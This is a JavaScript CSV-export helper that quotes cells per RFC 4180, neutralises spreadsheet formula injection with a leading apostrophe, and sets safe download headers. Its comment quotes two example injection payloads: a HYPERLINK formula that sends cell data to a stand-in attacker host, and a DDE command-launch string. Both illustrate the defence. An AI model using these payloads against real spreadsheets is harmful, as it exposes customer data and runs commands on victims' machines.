// CSV cell escaping, shared by every server-side export.
//
// Two separate jobs, and the second is the one that is easy to miss:
//
// 1. RFC-4180 quoting so a value containing a delimiter, quote or newline does
//    not break the row structure.
//
// 2. FORMULA NEUTRALISATION. Excel, LibreOffice and Google Sheets evaluate any
//    cell whose text begins with = + - @ (or a tab/CR that leaves one of those
//    first). A customer who checks out as
//        =HYPERLINK("https://evil.tld/?d="&C2&D2,"open")
//    puts a working exfiltration link into the bookkeeper's spreadsheet, and
//    =cmd|'/c calc'!A1 reaches DDE. The data is attacker-controlled — guest
//    checkout names, supplier names typed from a paper invoice — so the export is
//    a real delivery mechanism, not a theoretical one.
//
// A leading apostrophe is the conventional fix: spreadsheets treat the cell as
// literal text and do not display the apostrophe itself.

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[",;\n\r\t]/;

function csvCell(value) {
  let s = String(value === null || value === undefined ? '' : value);
  if (FORMULA_TRIGGER.test(s)) s = `'${s}`;
  return NEEDS_QUOTING.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Build a full CSV document. Rows are arrays of raw values.
 *
 * The UTF-8 BOM matters here: without it Excel on Windows decodes the file as
 * the local codepage and mangles every Icelandic character (ð þ æ ö á í), which
 * makes an otherwise-correct accounting export unusable.
 */
function toCsv(header, rows, { bom = true } = {}) {
  const body = [header, ...rows]
    .map(row => row.map(csvCell).join(','))
    .join('\r\n');
  return `${bom ? '﻿' : ''}${body}\r\n`;
}

// Content-Type + Content-Disposition for a CSV download. The filename is scrubbed
// so a value derived from user data cannot inject header fields.
function csvHeaders(res, filename) {
  const safe = String(filename).replace(/[^\w.-]/g, '_');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${safe}"`);
  // Exports carry customer and supplier detail; keep them out of shared caches.
  res.setHeader('Cache-Control', 'no-store');
}

module.exports = { csvCell, toCsv, csvHeaders, FORMULA_TRIGGER };
